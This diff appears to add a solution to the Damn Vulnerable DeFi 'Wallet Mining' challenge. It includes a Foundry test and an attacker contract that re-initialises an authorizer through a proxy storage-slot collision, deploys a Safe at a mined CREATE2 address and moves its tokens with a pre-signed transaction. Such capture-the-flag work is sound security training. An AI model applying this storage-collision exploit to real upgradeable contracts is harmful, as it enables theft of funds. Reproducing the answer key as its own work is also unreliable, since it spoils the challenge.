@@ -154,10 +154,79 @@ contract WalletMiningChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * =========================================================
+     * SOLUTION - test_walletMining()
+     * =========================================================
+     * Attack: proxy-storage-collision re-init + mined CREATE2 Safe address
+     * The TransparentProxy declares `address upgrader` at slot 0, colliding with
+     * AuthorizerUpgradeable.needsInit (also slot 0). After construction slot 0
+     * holds the upgrader address (non-zero), so the needsInit guard is bypassed
+     * and init() can be called AGAIN by anyone.
+     * The deposit address is just a counterfactual Safe; saltNonce 13 makes
+     * createProxyWithNonce land exactly on USER_DEPOSIT_ADDRESS.
+     *
+     * Off-chain (cheatcodes, no player tx): mine the nonce and sign the Safe's
+     * drain tx with the user's key. Then in ONE player tx the attacker:
+     *   1. authorizer.init([attacker],[deposit]) - re-init via the collision.
+     *   2. walletDeployer.drop(deposit, initializer, 13) - deploy Safe + earn 1 DVT.
+     *   3. Safe.execTransaction(transfer user 20M DVT) with the user's signature.
+     *   4. forward the 1 DVT reward to ward.
+     *
+     * user never sends a tx (nonce 0); player executes exactly one (the CREATE).
+     * =========================================================
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // Single-owner Safe.setup initializer; owner is the user.
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0)))
+        );
+
+        // The Safe drain call: transfer all 20M DVT to the user.
+        bytes memory drainData = abi.encodeWithSignature("transfer(address,uint256)", user, DEPOSIT_TOKEN_AMOUNT);
+
+        // Compute the Safe tx hash for nonce 0 at the (known) deposit address and
+        // sign it with the user's key. Cheatcodes do not count as player txs.
+        bytes32 safeTxHash = _safeTxHash(USER_DEPOSIT_ADDRESS, address(token), drainData);
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, safeTxHash);
+        bytes memory sig = abi.encodePacked(r, s, v);
+
+        // One player transaction: deploy the attacker, which does everything.
+        new WalletMiningAttacker(
+            address(authorizer),
+            address(walletDeployer),
+            address(token),
+            USER_DEPOSIT_ADDRESS,
+            ward,
+            initializer,
+            13, // mined saltNonce
+            drainData,
+            sig
+        );
+    }
+
+    // Recreate Safe.encodeTransactionData for a Safe at `safe`, nonce 0, default fields.
+    function _safeTxHash(address safe, address to, bytes memory data) internal view returns (bytes32) {
+        bytes32 DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;
+        bytes32 SAFE_TX_TYPEHASH = 0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;
+        bytes32 domain = keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, block.chainid, safe));
+        bytes32 structHash = keccak256(
+            abi.encode(
+                SAFE_TX_TYPEHASH,
+                to,
+                uint256(0), // value
+                keccak256(data),
+                Enum.Operation.Call,
+                uint256(0), // safeTxGas
+                uint256(0), // baseGas
+                uint256(0), // gasPrice
+                address(0), // gasToken
+                address(0), // refundReceiver
+                uint256(0) // nonce
+            )
+        );
+        return keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domain, structHash));
     }
 
     /**
@@ -189,4 +258,82 @@ contract WalletMiningChallenge is Test {
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
     }
+}
+
+/**
+ * =========================================================
+ * SOLUTION CONTRACT - WalletMiningAttacker
+ * =========================================================
+ * Executes the entire exploit in its constructor (the single player tx):
+ * re-initialises the Authorizer through the proxy storage collision to grant
+ * itself authorization, drops the counterfactual Safe at the deposit address
+ * via WalletDeployer (collecting the 1 DVT reward), drains the deposit's 20M
+ * DVT to the user with the user's pre-supplied signature, then forwards the
+ * 1 DVT reward to the ward.
+ * Placed after the test class per DVDv4 convention.
+ * =========================================================
+ *
+ * @notice One-transaction Wallet Mining exploit driver.
+ * @dev All authority is bootstrapped inside the constructor; no user tx needed.
+ */
+contract WalletMiningAttacker {
+    constructor(
+        address authorizer,
+        address walletDeployer,
+        address token,
+        address deposit,
+        address ward,
+        bytes memory initializer,
+        uint256 saltNonce,
+        bytes memory drainData,
+        bytes memory sig
+    ) {
+        // 1. Re-init the Authorizer (slot-0 collision left needsInit non-zero),
+        //    granting THIS contract authorization to deploy at the deposit address.
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = deposit;
+        IAuthorizer(authorizer).init(wards, aims);
+
+        // 2. Deploy the Safe to the deposit address and collect the 1 DVT reward.
+        require(IWalletDeployer(walletDeployer).drop(deposit, initializer, saltNonce), "drop failed");
+
+        // 3. Drain the deposit's 20M DVT to the user via the Safe, using the
+        //    user's off-chain signature (the Safe owner is the user).
+        ISafe(deposit).execTransaction(
+            token, 0, drainData, 0, 0, 0, 0, address(0), payable(address(0)), sig
+        );
+
+        // 4. Forward the 1 DVT deployment reward to the ward.
+        IERC20Like(token).transfer(ward, IERC20Like(token).balanceOf(address(this)));
+    }
+}
+
+interface IAuthorizer {
+    function init(address[] memory wards, address[] memory aims) external;
+}
+
+interface IWalletDeployer {
+    function drop(address aim, bytes memory wat, uint256 num) external returns (bool);
+}
+
+interface ISafe {
+    function execTransaction(
+        address to,
+        uint256 value,
+        bytes calldata data,
+        uint8 operation,
+        uint256 safeTxGas,
+        uint256 baseGas,
+        uint256 gasPrice,
+        address gasToken,
+        address payable refundReceiver,
+        bytes memory signatures
+    ) external payable returns (bool);
+}
+
+interface IERC20Like {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
 }
